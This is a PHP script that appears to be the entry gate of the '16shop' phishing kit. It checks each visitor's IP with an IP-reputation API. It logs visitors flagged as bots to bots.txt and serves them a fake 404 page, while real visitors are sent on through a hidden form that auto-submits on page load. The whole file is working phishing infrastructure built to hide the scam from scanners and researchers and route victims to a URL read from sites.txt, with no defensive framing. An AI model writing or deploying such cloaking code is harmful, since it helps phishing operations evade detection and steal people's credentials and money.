<?php
include 'antibot.php';
include 'css/function.php';

$ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, "https://api.iptrooper.net/check/$ip?full=1");
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 $result = curl_exec($ch);
 $result = json_decode($result);
 
 //define all array
 $asn ="$result->asn";
 $bad = "$result->bad";
 $code = "$result->code";
 $country ="$result->country";
 $ipaddress ="$result->ipaddress";
 $name="$result->name";
 $type="$result->type";

 $key = substr(sha1(mt_rand()),1,25);
 
if ($result->type=='valid') {
            
            $content = "#> [".$ip."] \r\n";
		    $save=fopen("visit_log.txt","a+");
		    fwrite($save,$content);
		    fclose($save);
			$url = file_get_contents('sites.txt');
            $password = "16shop"; 

			
 }
 else{
			$content = "#> [".$ip."] \r\n";
		    $save=fopen("bots.txt","a+");
		    fwrite($save,$content);
		    fclose($save);
			header("HTTP/1.0 404 Not Found");exit();
 }

?>

<html>
    <body onload="document.form.submit()">
		<form name="form" id="form" action="<?php echo $url;?>" method="POST">
		<div style="display:none;">
		<input  value="<?php echo md5($password);?>">
		<input type="submit" value="Continue">
		</div>
		</form>
	</body>
</html>